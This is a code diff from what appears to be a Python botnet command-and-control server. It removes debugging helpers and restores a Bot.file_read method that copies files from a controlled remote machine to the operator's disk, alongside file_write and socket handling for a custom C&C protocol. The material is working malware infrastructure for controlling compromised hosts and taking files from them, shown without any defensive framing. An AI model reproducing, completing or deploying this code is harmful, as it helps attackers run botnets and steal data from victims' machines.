@@ -24,7 +24,6 @@ import sys
 import readline
 import os
 import os.path
-import select
 
 # More standard imports...
 from socket import *
@@ -40,9 +39,6 @@ from time import sleep
 from functools import wraps
 from multiprocessing import Process
 from subprocess import check_output
-
-
-sys.stdout.flush()
 
 # This is our first dependency and we check it now so
 # we know if we can use colors to show errors later.
@@ -388,15 +384,7 @@ def copy_stream(src, dst, count):
             break
         count = count - len(buffer)
         dst.write(buffer)
-        print("writing data:", count, "left")
 
-
-def discard_stream(src, count):
-    while count > 0:
-        chunk = src.read(min(65536, count))
-        if not chunk:
-            break
-        count -= len(chunk)
 ##############################################################################
 # C&C server over a custom TCP protocol.
 
@@ -606,26 +594,6 @@ def bot_action(method):
             raise
     return wrapper
 
-
-def flush_socket(sock, timeout=0.1):
-    sock.setblocking(0)  # non-blocking mode
-    try:
-        while True:
-            ready = select.select([sock], [], [], timeout)
-            if ready[0]:
-                try:
-                    data = sock.recv(4096)
-                    if not data:
-                        break
-                except socket.error:
-                    break
-            else:
-                break
-    finally:
-        sock.setblocking(1)  # restore blocking
-
-
-
 # This class is not exported because I don't see a real reason
 # for a user of this module to manually instance Bot objects.
 class Bot(object):
@@ -686,20 +654,12 @@ class Bot(object):
         self.alive = False
         return self.sock
 
-
-
     @bot_action
     def file_read(self, remote_file, local_file):
         self.sock.sendall( build_command(CMD_FILE_READ, remote_file) )
         data_len = get_resp_header(self.sock)
-
-        discard_stream(self.sock.makefile(), data_len)
-
-        #with open(local_file, "wb") as fd:
-        #    copy_stream(self.sock.makefile(), fd, data_len)
-        print("finished file read")
-        flush_socket(self.sock)
-
+        with open(local_file, "wb") as fd:
+            copy_stream(self.sock.makefile(), fd, data_len)
 
     @bot_action
     def file_write(self, local_file, remote_file):
@@ -709,7 +669,6 @@ class Bot(object):
             fd.seek(0, 0)
             self.sock.sendall( build_command(CMD_FILE_WRITE, remote_file, file_size) )
             copy_stream(fd, self.sock.makefile(), file_size)
-        print("finished file read")
         get_resp_no_data(self.sock)
 
     @bot_action
@@ -2308,4 +2267,4 @@ def main(args = None):
 
 if __name__ == "__main__":
     main()      # colorama already initialized when imported
-    deinit()    # cleanup coloramaxit
+    deinit()    # cleanup colorama
